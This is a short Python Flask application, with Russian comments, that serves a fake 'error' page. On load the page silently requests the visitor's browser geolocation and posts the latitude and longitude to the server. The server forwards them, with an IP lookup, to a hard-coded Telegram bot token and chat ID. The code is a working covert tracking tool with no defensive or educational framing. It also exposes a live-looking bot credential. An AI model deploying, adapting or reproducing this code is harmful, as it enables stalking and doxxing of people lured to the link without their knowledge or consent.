from flask import Flask, request, render_template_string
import requests
import telegram

app = Flask(__name__)

# Настройки Telegram бота
bot_token = '7683343482:AAGWsiV8hCj9mt1kWT5YACm4ycFNmykyLcw'  # Токен бота
chat_id = '1200755705'  # ID чата

# Функция для отправки сообщения через Telegram
def send_telegram_message(message):
    bot = telegram.Bot(token=bot_token)
    bot.send_message(chat_id=chat_id, text=message)

@app.route('/')
def index():
    site_ip = requests.get('https://api.ipify.org').text  # Получаем IP сайта
    send_telegram_message(f"IP сайта: {site_ip}")  # Отправляем IP сайта
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>GeoLocation</title>
    </head>
    <body>
        <h1>$ERROR</h1>
        <script>
            function sendLocation(position) {
                const data = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };
                fetch('/send_data', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => {
                    return response.text();
                })
                .then(text => {
                    console.log(text);
                })
                .catch(err => {
                    console.error('Error:', err);
                });
            }

            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(sendLocation);
                } else {
                    alert("Геопозиция не поддерживается вашим браузером.");
                }
            }

            window.onload = getLocation;
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/send_data', methods=['POST'])
def send_data():
    user_ip = requests.get('https://ip-api.com/json').json().get('query', 'Неизвестно')
    client_data = request.get_json()
    latitude = client_data.get("latitude", "Неизвестно")
    longitude = client_data.get("longitude", "Неизвестно")
    message = (
        f"IP пользователя: {user_ip}\n"
        f"Широта: {latitude}\n"
        f"Долгота: {longitude}"
    )
    send_telegram_message(message)
    return "Данные отправлены боту!", 200

if __name__ == "__main__":
    send_telegram_message("Бот запущен!")  # Отправка сообщения при запуске
    app.run()
